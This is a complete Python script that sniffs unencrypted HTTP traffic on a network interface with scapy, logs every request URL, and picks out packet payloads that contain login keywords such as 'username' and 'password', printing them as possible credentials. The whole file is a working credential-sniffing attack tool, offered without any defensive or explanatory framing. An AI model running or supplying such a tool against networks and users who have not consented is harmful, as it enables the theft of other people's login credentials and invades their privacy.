#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            data = packet[scapy.Raw].load.decode()
            keywords = ['username', 'user', 'uname', 'login', 'password', 'pswrd', 'pass']
            for keyword in keywords:
                if keyword in data:
                    return data
                    break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] Http Request >> ' + url)

        login_info = get_login_info(packet)
        if login_info:
            print(colored('\n------------------------------------------------------------------------------------', color='green'))
            print(colored('Possible Credentials', color='yellow', attrs=['blink', 'bold']))
            print(colored(login_info, color='red', attrs=['bold']))
            print(colored('------------------------------------------------------------------------------------\n', color='green'))


sniff('eth0')